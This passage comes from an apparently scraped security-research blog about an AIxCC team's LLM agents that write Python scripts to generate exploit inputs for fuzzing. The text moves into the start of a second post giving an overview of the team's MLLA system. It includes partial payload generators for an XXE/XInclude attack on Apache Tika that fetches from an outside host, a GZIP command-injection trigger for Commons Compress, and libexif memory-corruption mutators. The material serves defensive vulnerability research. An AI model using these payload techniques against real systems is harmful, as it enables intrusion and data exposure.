‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò Retry Generation (up to 4 iterations) The iterative refinement loop allows BlobGen to learn from execution feedback and progressively improve its payload generation script until it successfully reaches the target vulnerability.\nExample Approach: Apache Commons Compress GZIP\ndef create_payload() -\u0026gt; bytes: payload = bytearray() # Initial Setup: Create GZIP header structure payload.extend([0x1f, 0x8b]) # GZIP magic bytes (ID1, ID2) payload.append(8) # Compression method (CM) - must be 8 (DEFLATED) payload.append(0x08) # Flags (FLG) - set FNAME bit (0x08) to include filename mtime = 1731695077 # This is the key condition that triggers the vulnerability payload.extend(struct.pack(\u0026#39;\u0026lt;I\u0026#39;, mtime)) # 4 bytes little-endian payload.append(0) # Extra flags (XFL) - can be 0 payload.append(0) # Operating system (OS) - can be any value filename = b\u0026#34;jazze\u0026#34; # The filename \u0026#34;jazze\u0026#34; will be passed to ProcessBuilder constructor payload.extend(filename) payload.append(0) # Null terminator for filename # Add minimal compressed data to avoid EOF exceptions compressed_data = bytes([ 0x03, 0x00, # Minimal deflate block (final, no compression) 0x00, 0x00, 0x00, 0x00, # CRC32 (4 bytes) 0x00, 0x00, 0x00, 0x00 # ISIZE (4 bytes) ]) payload.extend(compressed_data) return bytes(payload) # MUST return only bytes, not tuple/dict Notice the surgical precision: exact modification time, specific filename pattern, proper GZIP structure. BlobGen discovered these requirements through iterative coverage analysis, using the line-level coverage data (file names, function names, and line numbers) to add @VISITED markers and track progress toward the vulnerability.\nWhen BlobGen Wins: Known vulnerability path, strict format requirements, need for precise value combinations.\nüé≤ Generator Agent: The Probability Explorer Then we discovered something counterintuitive that changed our whole approach: when you can\u0026rsquo;t predict which attack will succeed, systematic variation beats precision. The Generator Agent emerged from a crucial realization ‚Äì instead of fighting LLM non-determinism, we could weaponize it.\nThe Approach: Generator creates generate(rnd: random.Random) -\u0026gt; bytes functions that produce 20 variations per iteration. This probabilistic strategy turns LLM non-determinism from weakness into strength through systematic exploration.\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ Plan ‚îÇ‚îÄ‚îÄ‚îÄ‚ñ∂‚îÇ Create/Improve ‚îÇ‚îÄ‚îÄ‚îÄ‚ñ∂‚îÇ Collect ‚îÇ ‚îÇ Generator ‚îÇ ‚îÇ Generator ‚îÇ ‚îÇ Coverage ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚ñ≤ ‚îÇ ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∂‚îÇ ‚îÇ ‚îÇ ‚îÇ ‚ñº ‚îÇ ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ ‚îÇ Analyze ‚îÇ‚óÄ‚îÄ‚îÄ‚îÄ‚îÇ Update ‚îÇ ‚îÇ ‚îÇ Coverage ‚îÇ ‚îÇ Interesting ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ Functions ‚îÇ ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ ‚ñº ‚îÇ ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ ‚îÇ Finalize ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ Iterative Improvement Loop (20 variations per iteration) The probabilistic approach generates multiple variations and learns from collective coverage patterns, dramatically increasing the likelihood of reaching target vulnerability points that single-attempt strategies often miss.\nExample Approach: Apache Tika XXE Attack Suite\ndef generate(rnd: random.Random) -\u0026gt; bytes: # ... # Phase 1: Create valid ZIP structure to reach parseRoot strategy = rnd.choice([\u0026#39;basic_xxe\u0026#39;, \u0026#39;xinclude\u0026#39;, \u0026#39;schema_ref\u0026#39;, \u0026#39;dtd_external\u0026#39;]) # Generate root filename root_filename = rnd.choice([\u0026#39;root.xml\u0026#39;, \u0026#39;data.xml\u0026#39;, \u0026#39;content.xml\u0026#39;, \u0026#39;main.xml\u0026#39;]) # Create Manifest.xml content manifest_content = f\u0026#39;\u0026#39;\u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;manifest\u0026gt;\u0026lt;Root\u0026gt;{root_filename}\u0026lt;/Root\u0026gt;\u0026lt;/manifest\u0026gt;\u0026#39;\u0026#39;\u0026#39;.encode(\u0026#39;utf-8\u0026#39;) # Phase 2: Generate exploit payload based on strategy if strategy == \u0026#39;basic_xxe\u0026#39;: # XXE with external entity targeting jazzer.com port = rnd.choice([80, 443, 8080, 8443]) path = rnd.choice([\u0026#39;\u0026#39;, \u0026#39;/test\u0026#39;, \u0026#39;/data.xml\u0026#39;, \u0026#39;/api/endpoint\u0026#39;, \u0026#39;/config\u0026#39;]) root_content = f\u0026#39;\u0026#39;\u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE root [\u0026lt;!ENTITY xxe SYSTEM \u0026#34;http://jazzer.com:{port}{path}\u0026#34;\u0026gt;]\u0026gt; \u0026lt;root\u0026gt;\u0026amp;xxe;\u0026lt;/root\u0026gt;\u0026#39;\u0026#39;\u0026#39;.encode(\u0026#39;utf-8\u0026#39;) elif strategy == \u0026#39;xinclude\u0026#39;: # XInclude attack targeting jazzer.com path = rnd.choice([\u0026#39;/data.xml\u0026#39;, \u0026#39;/config.xml\u0026#39;, \u0026#39;/api/data\u0026#39;, \u0026#39;/external.xml\u0026#39;]) protocol = rnd.choice([\u0026#39;http\u0026#39;, \u0026#39;https\u0026#39;]) root_content = f\u0026#39;\u0026#39;\u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;root xmlns:xi=\u0026#34;http://www.w3.org/2001/XInclude\u0026#34;\u0026gt; \u0026lt;xi:include href=\u0026#34;{protocol}://jazzer.com{path}\u0026#34;/\u0026gt; \u0026lt;/root\u0026gt;\u0026#39;\u0026#39;\u0026#39;.encode(\u0026#39;utf-8\u0026#39;) # ... (other strategies) ... # Build ZIP file structure files = [ (\u0026#39;Manifest.xml\u0026#39;, manifest_content), (root_filename, root_content) ] # Add random additional files occasionally if rnd.random() \u0026lt; 0.3: extra_content = b\u0026#39;\u0026lt;extra\u0026gt;data\u0026lt;/extra\u0026gt;\u0026#39; files.append((\u0026#39;extra.xml\u0026#39;, extra_content)) return create_zip(files, rnd) # ... (helper functions) ... Why Generator Dominates:\nProbabilistic Success: If attempt #7 fails but #13 succeeds, you still win Format Mastery: Handles ZIP + XML + XXE simultaneously Strategic Variation: Not random ‚Äì intelligent exploration of attack space Coverage Merger: Learns from ALL 20 variations, not just successes The probabilistic approach overcomes LLM non-determinism by embracing it rather than fighting it.\nWhen Generator Wins: Complex formats, multiple valid approaches, exploration over precision.\nüîß Mutator Agent: The Surgical Specialist The final breakthrough came when we hit a wall: some vulnerability paths were so complex that even the most capable LLMs couldn\u0026rsquo;t hold the entire context. The Mutator Agent\u0026rsquo;s solution was elegantly simple ‚Äì focus on single transitions between functions rather than trying to comprehend the whole picture.\nThe Strategy: Mutator creates mutate(rnd: random.Random, seed: bytes) -\u0026gt; bytes functions that surgically target specific function-to-function transitions. This focused approach handles large codebases by concentrating on precise transition points.\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ Plan ‚îÇ ‚îÇ Mutation ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ ‚ñº ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ Create/Improve ‚îÇ‚îÄ‚îÄ‚îÄ‚ñ∂‚îÇ Analyze ‚îÇ‚îÄ‚îÄ‚îÄ‚ñ∂‚îÇ Finalize ‚îÇ ‚îÇ Mutator ‚îÇ ‚îÇ Mutator ‚îÇ ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚ñ≤ ‚îÇ ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò Improvement Loop (focused on single transitions) The focused analysis loop concentrates on single function transitions, making it effective when full vulnerability context would overwhelm LLM context limits while still enabling precise payload mutations.\nExample Approach: libexif Memory Corruption\ndef mutate(rnd: random.Random, seed: bytes) -\u0026gt; bytes: # ... exif_pos = seed.find(b\u0026#39;Exif\\x00\\x00\u0026#39;) tiff_start = exif_pos + 6 # ... (boundary checks) ... makernote_pos = _find_makernote_start(seed, tiff_start) if makernote_pos == -1: makernote_pos = min(tiff_start + 64, len(seed)) prefix = seed[:makernote_pos] body = seed[makernote_pos:] # 30% chance for generic mutations to maintain diversity if rnd.random() \u0026lt; 0.3: return _generic_mutate(rnd, seed) # Apply format-specific mutations to Makernote section mutated_body = _mutate_makernote(rnd, body) result = prefix + mutated_body return result[:min(len(result), 102400)] def _mutate_makernote(rnd, body): strategy = rnd.randint(0, 5) if strategy == 0: return _mutate_signature(rnd, body) elif strategy == 1: return _mutate_endianness(rnd, body) elif strategy == 2: return _mutate_directory(rnd, body) # Corrupt directory counts and field types elif strategy == 3: return _mutate_sizes(rnd, body) # Create oversized data fields elif strategy == 4: return _mutate_offsets(rnd, body) # Corrupt offset values for out-of-bounds access else: return _byte_mutations(rnd, body) # ... (mutation strategy implementations) ... Why Mutator Succeeded: When dealing with deep call chains where understanding the full context would overwhelm even the most capable LLM, Mutator\u0026rsquo;s focused approach shines. It doesn\u0026rsquo;t need to understand the entire vulnerability ‚Äì just how to navigate from function A to function B.\nWhen Mutator Wins: Deep call graphs, context limitations, specific transition requirements.\nAfter months of development, we were ready to put BGA to the ultimate test: the AIxCC competition against some of the world\u0026rsquo;s best security teams.\nCompetition Results and Technical Analysis Seven Critical Discoveries The AIxCC competition became our proving ground. When the dust settled, BGA had discovered 7 unique vulnerabilities ‚Äì genuine bugs in production software that other approaches had completely missed. Each discovery validated a different aspect of our multi-agent approach.\nAgent Vulnerabilities Found Approach Generator 4 PoVs Probabilistic exploration with 20+ variations BlobGen 2 PoVs Iterative refinement with coverage feedback Mutator 1 PoV Surgical targeting of function transitions Total 7 PoVs Multi-agent coordination These discoveries validate the multi-agent, script-based approach, though the specific code examples shown throughout this post come from earlier development and rounds, illustrating how the techniques work in practice.\nWhy Multiple Agents Were Necessary A critical question emerged during development: if Generator was finding the most bugs, why not just use it for everything? The answer revealed a fundamental insight about vulnerability exploitation ‚Äì different bug classes require completely different evolutionary strategies.\nThe Orchestrator coordinates this by analyzing each vulnerability candidate and dispatching appropriate agents concurrently. Some vulnerabilities need surgical precision, others benefit from probabilistic exploration, and still others require iterative refinement. Rather than forcing one approach on all problems, the multi-agent system lets each strategy handle what it does best while running in parallel through intelligent orchestration.\nThe Technical Breakthroughs Behind Our Success Looking back, several key innovations emerged that we believe enabled these discoveries:\nThe Script-Based Revolution: Our core breakthrough was teaching LLMs to generate Python programs instead of raw payloads. This paradigm shift unlocked complex format handling, dynamic value incorporation, and self-documenting exploit logic.\nProbabilistic Exploration Strategy: The Generator approach embraces systematic variation rather than hoping for deterministic success:\n# Traditional approach often fails: perfect_payload = generate_perfect() # Multi-variation approach: try systematic alternatives for i in range(20): variant = generate(random.Random(seed + i)) result = execute(variant) coverage.merge(result) # Learn from ALL attempts Collective Learning from Execution: Rather than learning only from successes, the system analyzes patterns across all variations, merging coverage data from multiple payload attempts to understand which strategies are making progress toward the target vulnerability.\nCoverage-Guided Evolution: We used line coverage information consisting of hit file name, function name, and line number to guide the LLM evolution process. While this coverage data wasn\u0026rsquo;t always perfectly accurate, it provided crucial intelligence that helped our agents understand which parts of the target code were being reached and which critical paths remained unexplored. BlobGen used structured feedback showing exactly which vulnerability conditions were hit versus missed, while Generator tracked collective coverage patterns across all 20+ variations to understand which strategies were making progress toward targets.\nThese innovations proved especially effective against the types of vulnerabilities we encountered, which shared several challenging characteristics:\nFormat Complexity: Multi-layer format requirements (valid ZIP containing valid XML containing valid XXE) that challenge traditional random approaches Semantic Requirements: Understanding that specific functions execute commands or that certain values trigger vulnerabilities Precision Constraints: Exact checksums, specific string patterns, correct binary structures Multiple Valid Attack Paths: Different strategies leading to the same vulnerability We believe traditional approaches would require millions of attempts to accidentally discover these combinations, while the self-evolving approach found them more systematically through code understanding, execution feedback, and adaptive strategy refinement.\nReflecting on this journey, several key insights emerged that go beyond just the technical implementation.\nLessons Learned: Key Insights from Development Developing BGA revealed several critical insights about LLM-based security research and multi-agent coordination:\nContext Management and LLM Limitations One of our biggest revelations was that LLM context limitations aren\u0026rsquo;t just about token counts ‚Äì they\u0026rsquo;re about meaningful reasoning boundaries. The Mutator Agent\u0026rsquo;s focused transition analysis emerged from recognizing that trying to understand entire call graphs often overwhelmed the LLM\u0026rsquo;s ability to provide precise analysis. By concentrating on single function transitions, we achieved surgical precision that wouldn\u0026rsquo;t be possible with broader context.\nThe Power of Indirection Perhaps our most transformative insight was realizing that the best way to get what you want from an LLM isn\u0026rsquo;t always to ask for it directly. By asking for executable exploit recipes rather than raw exploits, we discovered we could leverage LLM strengths (code generation and logical reasoning) while sidestepping their weaknesses (precise binary format construction).\nMulti-Agent Coordination Challenges We quickly learned that coordinating multiple LLM agents creates entirely new classes of problems that simply don\u0026rsquo;t exist in single-agent systems. Building effective multi-agent orchestration required breakthroughs in several areas:\nFault Isolation is critical ‚Äì one agent\u0026rsquo;s failure cannot cascade to others, requiring careful async error handling Resource Management through semaphore-based concurrency control prevents system exhaustion while maintaining parallelism Context Transformation requires tailoring information for each agent\u0026rsquo;s specialized needs rather than broadcasting everything Intelligent Filtering eliminates redundant work across agents to avoid wasting computational resources Work Distribution requires understanding each agent\u0026rsquo;s strengths and dispatching appropriate vulnerability contexts Result Aggregation from multiple concurrent agents while maintaining system stability and preventing race conditions Domain Knowledge Integration Rather than overwhelming LLMs with comprehensive security knowledge, we found that adaptive, context-sensitive guidance works better. The system selectively integrates vulnerability patterns and data structure insights based on target-specific analysis, preventing information overload while ensuring relevant knowledge reaches the agents.\nWhen \u0026ldquo;Good Enough\u0026rdquo; Beats Perfect The Generator Agent taught us a counterintuitive lesson about working with non-deterministic systems: sometimes it\u0026rsquo;s better to generate 20 \u0026ldquo;good enough\u0026rdquo; attempts than to spend all your effort trying to craft one perfect solution. This insight applies far beyond exploit generation ‚Äì it\u0026rsquo;s a fundamental principle for working with any probabilistic AI system.\nFor a deep dive into the context engineering techniques that enable these capabilities, see our post: Context Engineering: How BGA Teaches LLMs to Write Exploits\nSo where does this breakthrough lead us? The implications extend far beyond just finding vulnerabilities.\nFuture Vision: Where BGA Goes Next BGA\u0026rsquo;s success in AIxCC revealed something important: we already have incredible context information available, but we may not be utilizing it effectively.\nThe Context Goldmine We\u0026rsquo;re Sitting On Looking at our current pipeline, we have access to rich information that most LLM systems can only dream of:\nTestlang structure from our harness analysis Dictgen tokens and existing dictionary patterns in the repo Concolic constraints from our symbolic execution tools Call graphs from CPUA providing precise function relationships Bug information (BITs) from BCDA with detailed vulnerability context Plus many other analysis tools feeding structured data The realization hit us: we may not be utilizing these context sources effectively.\nContext Engineering: The Next Frontier Working with LLMs taught us they function much like humans in crucial ways:\nLove top-down descriptions - they need the big picture first Require context information and direct instructions - vague requests fail Core information is important and verbosity matters - too much noise hurts, too little context also hurts This points to a massive opportunity: context engineering. People talk about \u0026ldquo;prompt engineering,\u0026rdquo; but we think the future is \u0026ldquo;context engineering\u0026rdquo; - intelligently structuring and presenting information to maximize LLM effectiveness.\nThe Questions Driving Us Forward Context Optimization: How can we effectively structure all this rich information? Beyond Fuzzing: Can we build a full exploit agent for CTF targets (like XBOW) or real-world vulnerabilities without harnesses? Memory Utilization: Can we tap into LLMs\u0026rsquo; knowledge base like humans recall memories? They already know about Java\u0026rsquo;s ServletFileUpload, repository patterns, and common vulnerability classes Intermediate Representations: Is there an LLM-friendly structure for representing code, bugs, and exploitation context? Context Engineering for Discovery: Can better context engineering enhance not just exploitation but bug discovery itself? The Bigger Picture BGA proved that script-based generation works. Now the question becomes: how far can intelligent context engineering take us? The components are all there - we just need to learn how to orchestrate them more effectively.\nDive Deeper Ready to explore BGA in detail? Here are your next steps:\nüìö Technical Resources Source Code by Agent: Orchestrator Agent BlobGen Agent Generator Agent Mutator Agent üîó Related Deep Dives Context Engineering: How BGA Teaches LLMs to Write Exploits UniAFL: The Fuzzing Infrastructure MLLA Overview: The Complete System Deep dive into CPUA, MCGA, CGPA\u0026rsquo;s code understanding and navigation Coming Soon: BCDA - The AI Detective Separating Real Bugs from False Alarms Self-evolving exploits represent a different approach to AI-assisted security research ‚Äì one where adaptation and learning drive success rather than hoping for perfect initial generation.\n"},{"section":"Blog","slug":"/blog/post-mlla-overview/","title":"MLLA: Teaching LLMs to Hunt Bugs Like Security Researchers","description":"Overview of Multi-Language LLM Agent (MLLA) - The most LLM-intensive vulnerability discovery system in Atlantis-Multilang","date":"August 28, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/mlla/preview_hu_88e4d0bccb21d9cf.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"280\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/mlla\\/preview_hu_2006b2140c9f7286.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/mlla/preview_hu_a0b30be2ff61a1b1.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/mlla\\/preview_hu_ef38c25bc4990a61.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Multilang","tags":"mlla, llm, vulnerability-discovery, multi-agent","content":"When Fuzzing Meets Intelligence Picture this: you\u0026rsquo;re a security researcher staring at 20 million lines of code, hunting for vulnerabilities that could compromise everything from your smartphone to critical infrastructure. Traditional fuzzers approach this challenge with brute force ‚Äì throwing millions of random inputs at the program like a toddler mashing keyboard keys. Sometimes it works. Often, it doesn\u0026rsquo;t.\nBut what if we could change the game entirely?\nMeet MLLA (Multi-Language LLM Agent) ‚Äì the most ambitious experiment in AI-assisted vulnerability discovery we\u0026rsquo;ve ever built. Instead of random chaos, MLLA thinks, plans, and hunts bugs like an experienced security researcher, but at machine scale.\nWhy \u0026ldquo;Smart and Fast\u0026rdquo; Beats \u0026ldquo;Dumb and Fast\u0026rdquo; Don\u0026rsquo;t get us wrong ‚Äì traditional fuzzing has been a phenomenal success story. It\u0026rsquo;s uncovered thousands of critical vulnerabilities across every piece of software you use daily. But here\u0026rsquo;s the thing: traditional fuzzers are essentially very sophisticated random number generators. They don\u0026rsquo;t understand what they\u0026rsquo;re testing.\nA traditional fuzzer doesn\u0026rsquo;t know that ProcessBuilder in Java can execute system commands. It can\u0026rsquo;t recognize that deserializing untrusted data is a security minefield. It just flips bits and hopes something crashes ‚Äì which is both its greatest strength and its Achilles\u0026rsquo; heel.\nOver the years, researchers have tried to overcome this limitation with structure-aware fuzzing, crafting custom input generators or grammar models that understand formats like JSON, PDF, or TLS handshakes. But here\u0026rsquo;s the problem: building these harnesses is incredibly manual and brittle. Take fuzzing a TLS implementation: you need to painstakingly write a generator that encodes valid handshake messages, and one missing detail means your fuzzer just stalls at the parser. This kind of effort simply doesn\u0026rsquo;t scale.\nThe cracks in this approach become obvious when you face modern software\u0026rsquo;s complexity:\nValidation gauntlets: Modern programs have layers of input validation that random mutations rarely penetrate Format awareness: Try fuzzing a JSON API with random bytes ‚Äì you\u0026rsquo;ll spend 99% of your time triggering parsing errors instead of logic bugs State dependencies: Some vulnerabilities only appear after precise sequences of operations Multi-language chaos: Real systems blend C, Java, Python, and more in ways that single-language fuzzers can\u0026rsquo;t handle During the AIxCC competition, we hit every one of these walls. Traditional \u0026ldquo;spray and pray\u0026rdquo; fuzzing wasn\u0026rsquo;t going to find the sophisticated bugs hiding in modern codebases.\nThat\u0026rsquo;s when we decided to build something different.\nFrom Chaos to Strategy What if, instead of randomly mutating inputs, we could teach AI to craft attacks like a human security researcher would?\nOur UniAFL system explores this idea across six different input generation modules, each using AI at different intensity levels. At one extreme, you have traditional fuzzers with zero AI involvement. At the other extreme sits MLLA ‚Äì our \u0026ldquo;what happens if we go all-in on AI?\u0026rdquo; experiment.\nMLLA doesn\u0026rsquo;t just use LLMs as helpers for specific tasks. Instead, it\u0026rsquo;s built around the radical idea that AI should drive the entire vulnerability discovery process, from understanding code to crafting exploits.\nThe AI Dream Team Here\u0026rsquo;s where MLLA gets interesting: instead of building one monolithic AI brain, we created a team of specialist agents. Each one has a specific job, specific skills, and a specific personality. Together, they work like a cybersecurity consulting firm ‚Äì but one that never sleeps, never gets tired, and can analyze millions of lines of code simultaneously.\nüéØ Meet the Team MLLA\u0026rsquo;s multi-agent architecture orchestrating vulnerability discovery\rüìç CGPA (Call Graph Parser Agent): The Navigator Picture the most organized person you know ‚Äì the one who never gets lost, always knows exactly where everything is, and can give perfect directions to anywhere. That\u0026rsquo;s CGPA. In a codebase with millions of functions scattered across thousands of files, CGPA keeps everyone oriented. When another agent says \u0026ldquo;I need to analyze the function that processes user input,\u0026rdquo; CGPA instantly knows exactly which function, in which file, with which dependencies.\nüîç CPUA (CP Understanding Agent): The Scout Every heist movie has that character who cases the joint first ‚Äì mapping out entrances, exits, and security vulnerabilities. CPUA fills this role for code. It analyzes the \u0026ldquo;harness\u0026rdquo; (the entry point to the program) and identifies the most promising targets. Instead of wandering aimlessly through millions of functions, CPUA says \u0026ldquo;These 50 functions handle untrusted input ‚Äì start here.\u0026rdquo;\nüó∫Ô∏è MCGA (Make Call Graph Agent): The Cartographer If CGPA is your GPS, MCGA is the mapmaker who surveys uncharted territory. It traces how functions connect to each other, building detailed relationship maps across the entire codebase. But MCGA doesn\u0026rsquo;t just map roads ‚Äì it marks the dangerous neighborhoods. When it spots a function that deserializes data or executes system commands, it flags it as a high-value target.\nüéØ BCDA (Bug Candidate Detection Agent): The Detective Not every suspicious activity is actually a crime. BCDA is the seasoned detective who can tell the difference between a false alarm and the real deal. It takes MCGA\u0026rsquo;s marked locations and asks the hard questions: \u0026ldquo;Is this actually exploitable? What conditions need to be met? What would an attack look like?\u0026rdquo; BCDA produces what we call BITs ‚Äì detailed case files for genuine vulnerabilities.\nüí£ BGA (Blob Generation Agent): The Demolition Expert Here\u0026rsquo;s where the magic happens. Instead of just creating attack payloads, BGA writes programs that create attack payloads ‚Äì like a master criminal who doesn\u0026rsquo;t just plan one heist, but writes the playbook that can be adapted for any target. These Python scripts can generate thousands of variations, each one precisely crafted for the specific vulnerability BCDA identified.\nThe Revolutionary Approach: Programming Attacks Now you might be thinking: \u0026ldquo;Okay, cool agents, but what makes this actually different from existing tools?\u0026rdquo; Here\u0026rsquo;s where MLLA breaks new ground.\nTraditional vulnerability discovery tools face a fundamental trade-off: either go dumb-and-fast (random mutations that usually fail) or try to be smart-but-brittle (hand-crafted exploits that break easily). MLLA found a third way:\ndef create_payload() -\u0026gt; bytes: # BGA generates functions like this that construct exploits payload = b\u0026#34;HTTP/1.1\\r\\n\u0026#34; payload += b\u0026#34;x-evil-backdoor: \u0026#34; + sha256(b\u0026#34;breakin the law\u0026#34;).digest() payload += b\u0026#34;\\r\\nContent-Length: 42\\r\\n\\r\\n\u0026#34; payload += construct_command_injection(\u0026#34;jazzer\u0026#34;) return payload This approach allows MLLA to:\nHandle complex formats (JSON, XML, Protocol Buffers) Incorporate dynamic values (checksums, lengths, timestamps) Document the exploitation logic Iterate and refine based on feedback The Key Integration: These aren\u0026rsquo;t just proof-of-concept scripts. Every blob and script that MLLA generates feeds directly into UniAFL\u0026rsquo;s fuzzing infrastructure, where they become seeds for massive-scale testing campaigns. It\u0026rsquo;s the best of both worlds: human-level strategic thinking combined with machine-scale execution.\nBattle-Tested: The Apache Tika Story Theory is nice, but does this actually work in practice? Let\u0026rsquo;s walk through a real example from the AIxCC Final Round 3.\nThe Target: Apache Tika had just introduced a new 3DXML parser ‚Äì a feature for processing ZIP-based CAD files containing XML manifests and 3D model data. 